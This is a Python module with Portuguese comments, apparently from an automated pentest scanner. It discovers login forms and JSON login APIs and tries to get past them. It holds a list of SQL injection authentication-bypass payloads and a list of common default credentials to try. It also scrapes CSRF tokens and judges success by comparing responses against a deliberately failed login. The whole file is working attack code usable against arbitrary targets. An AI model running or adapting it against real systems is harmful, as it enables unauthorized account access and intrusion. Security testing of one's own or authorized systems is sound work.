"""Autenticação GENÉRICA dirigida por descoberta — sem rotas hardcoded.

Dado o perfil do alvo (target_discovery), tenta autenticar de forma agnóstica:
funciona com login por FORM (PHP/HTML, cookie de sessão + token CSRF) e por API
(SPA REST, token JSON). Detecta sucesso por BASELINE (compara com tentativa de
credencial claramente inválida) — nunca por rota fixa.

Usado por SQLi (auth-bypass), IDOR, CSRF, business_logic, etc.
"""

from __future__ import annotations

import re
import httpx

_TIMEOUT = httpx.Timeout(connect=6.0, read=12.0, write=6.0, pool=6.0)
_FAIL_RE = re.compile(r"(?i)(invalid|incorrect|fail|wrong|denied|unauthor|n[aã]o autoriz|"
                      r"inv[aá]lid|try again|bad credential|login.?error|senha)")
_TOKEN_KEYS = ("token", "access_token", "accessToken", "jwt", "authentication", "bearer", "id_token")
# credenciais triviais comuns (teste de senha fraca — padrão de pentest)
COMMON_CREDS = [("admin", "password"), ("admin", "admin"), ("admin", "admin123"),
                ("administrator", "password"), ("admin", "changeme"), ("test", "test"),
                ("root", "root"), ("user", "password")]
# payloads genéricos de bypass de autenticação por SQLi
SQLI_BYPASS = ["' OR '1'='1' -- ", "' OR 1=1-- -", "admin'-- ", "' OR '1'='1' #",
               "') OR ('1'='1'-- ", "\" OR 1=1-- ", "' OR 1=1 LIMIT 1-- "]


def _csrf_value(client: httpx.Client, page_url: str, field: str | None) -> str | None:
    if not field:
        return None
    try:
        html = client.get(page_url).text
    except Exception:
        return None
    m = re.search(rf"""name=['"]?{re.escape(field)}['"]?[^>]*value=['"]([^'"]*)""", html)
    if not m:
        m = re.search(rf"""value=['"]([^'"]*)['"][^>]*name=['"]?{re.escape(field)}""", html)
    return m.group(1) if m else None


def _token_in(body: str) -> bool:
    low = body[:400].lower()
    return any(k.lower() in low for k in _TOKEN_KEYS)


def try_form_login(client: httpx.Client, form: dict, user: str, pw: str) -> httpx.Response | None:
    data = {}
    for i in form.get("inputs", []):
        data[i["name"]] = i.get("value") or ""
    if form.get("user_field"):
        data[form["user_field"]] = user
    if form.get("password_field"):
        data[form["password_field"]] = pw
    if form.get("csrf_field"):
        tok = _csrf_value(client, form.get("page") or form["action"], form["csrf_field"])
        if tok:
            data[form["csrf_field"]] = tok
    # garantir botão de submit comum
    for k in ("Login", "login", "submit", "Submit"):
        data.setdefault(k, k)
    try:
        if form.get("method") == "post":
            return client.post(form["action"], data=data)
        return client.get(form["action"], params=data)
    except Exception:
        return None


def try_api_login(client: httpx.Client, url: str, user: str, pw: str) -> httpx.Response | None:
    # tenta as formas comuns de corpo JSON (campo de usuário variável)
    for body in ({"email": user, "password": pw}, {"username": user, "password": pw},
                 {"user": user, "pass": pw}, {"login": user, "password": pw}):
        try:
            r = client.post(url, json=body)
        except Exception:
            continue
        if r.status_code < 500:
            return r
    return None


def _success(resp: httpx.Response | None, fail: dict) -> tuple[bool, str]:
    """Sucesso relativo ao baseline de FALHA (credencial inválida)."""
    if resp is None:
        return False, ""
    body = resp.text or ""
    # API: token presente e ausente na falha
    if _token_in(body) and not fail.get("token"):
        return True, "token de sessão emitido (ausente na falha)"
    # cookie de sessão novo que a falha não setou
    new_cookies = set(resp.cookies.keys()) - set(fail.get("cookies", []))
    auth_cookie = [c for c in new_cookies if re.search(r"(?i)sess|token|auth|jwt|sid", c)]
    if resp.status_code in (200, 302) and auth_cookie:
        return True, f"cookie de sessão novo: {auth_cookie[0]}"
    # marcador de falha SUMIU (baseline tinha, agora não) — login deixou de falhar
    if fail.get("has_fail_marker") and not _FAIL_RE.search(body[:3000]) and resp.status_code in (200, 302):
        # e mudou de página/redirect em relação à falha
        if str(resp.url) != fail.get("url") or resp.status_code == 302:
            return True, "marcador de falha ausente + mudança de página vs baseline"
    return False, ""


def _failure_baseline(client: httpx.Client, login: dict) -> dict:
    bad_user, bad_pw = "zzqq_nouser_4471", "zzqq_nopass_9913"
    if login["kind"] == "form":
        r = try_form_login(client, login["form"], bad_user, bad_pw)
    else:
        r = try_api_login(client, login["url"], bad_user, bad_pw)
    if r is None:
        return {"cookies": [], "has_fail_marker": False, "url": "", "token": False}
    return {"cookies": list(r.cookies.keys()), "url": str(r.url),
            "has_fail_marker": bool(_FAIL_RE.search((r.text or "")[:3000])),
            "token": _token_in(r.text or "")}


def discover_logins(profile: dict) -> list[dict]:
    logins = []
    for f in profile.get("login_forms", []):
        logins.append({"kind": "form", "form": f, "where": f["action"]})
    for url in profile.get("api_login_candidates", []):
        logins.append({"kind": "api", "url": url, "where": url})
    return logins


def authenticate(base: str, profile: dict, *, try_sqli: bool = False) -> dict:
    """Tenta autenticar via login descoberto. Retorna sessão + se houve bypass SQLi."""
    logins = discover_logins(profile)
    out = {"authenticated": False, "session_cookies": {}, "token": None,
           "method": None, "sqli_bypass": None, "where": None}
    with httpx.Client(timeout=_TIMEOUT, follow_redirects=True, verify=False) as c:
        for login in logins:
            fail = _failure_baseline(c, login)
            attempts = []
            if try_sqli:
                attempts += [("sqli", p, "x") for p in SQLI_BYPASS]
            attempts += [("creds", u, p) for u, p in COMMON_CREDS]
            for kind, user, pw in attempts:
                r = (try_form_login(c, login["form"], user, pw) if login["kind"] == "form"
                     else try_api_login(c, login["url"], user, pw))
                ok, ev = _success(r, fail)
                if ok:
                    tok = None
                    try:
                        j = r.json()
                        tok = (j.get("authentication", {}) or {}).get("token") or j.get("token") or j.get("access_token")
                    except Exception:
                        pass
                    out.update({"authenticated": True, "method": login["kind"],
                                "where": login["where"], "token": tok,
                                "session_cookies": dict(c.cookies),
                                "evidence": ev})
                    if kind == "sqli":
                        out["sqli_bypass"] = {"login": login["where"], "payload": user, "evidence": ev}
                    return out
    return out
